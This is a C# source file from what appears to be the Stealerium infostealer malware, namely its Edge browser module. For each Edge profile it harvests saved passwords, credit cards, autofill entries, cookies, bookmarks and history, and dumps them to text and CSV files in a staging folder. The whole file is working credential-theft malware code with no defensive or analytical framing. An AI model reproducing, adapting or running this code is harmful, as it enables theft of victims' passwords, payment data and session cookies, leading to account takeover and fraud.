using System.IO;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Target.Browsers.Chromium;

namespace Stealerium.Stub.Target.Browsers.Edge
{
    internal sealed class RecoverEdge
    {
        public static void Run(string sSavePath)
        {
            var sFullPath = Paths.Lappdata + "\\" + Paths.EdgePath;

            if (!Directory.Exists(sFullPath))
                return;

            var sBDir = sSavePath + "\\Edge";
            Directory.CreateDirectory(sBDir);
            foreach (var sProfile in Directory.GetDirectories(sFullPath))
                if (File.Exists(sProfile + "\\Login Data"))
                {
                    // Run tasks
                    var pCreditCards = CreditCards.Get(sProfile + "\\Web Data");
                    var pAutoFill = Autofill.Get(sProfile + "\\Web Data");
                    var pBookmarks = Bookmarks.Get(sProfile + "\\Bookmarks");
                    var pPasswords = Chromium.Passwords.Get(sProfile + "\\Login Data");
                    var pCookies = Cookies.Get(sProfile + "\\Cookies");
                    var pHistory = History.Get(sProfile + "\\History");
                    // Await values and write
                    CBrowserUtils.WriteCreditCards(pCreditCards, sBDir + "\\CreditCards.txt");
                    CBrowserUtils.WriteAutoFill(pAutoFill, sBDir + "\\AutoFill.txt");
                    CBrowserUtils.WriteBookmarks(pBookmarks, sBDir + "\\Bookmarks.txt");
                    CBrowserUtils.WritePasswordsToTxt(pPasswords, sBDir + "\\Passwords.txt");
                    CBrowserUtils.WritePasswordsToCsv(pPasswords, sBDir + "\\Passwords.csv");
                    // Create a README.txt file in the directory
                    CBrowserUtils.CreateReadme(sBDir);
                    CBrowserUtils.WriteCookies(pCookies, sBDir + "\\Cookies.txt");
                    CBrowserUtils.WriteHistory(pHistory, sBDir + "\\History.txt");
                }
        }
    }
}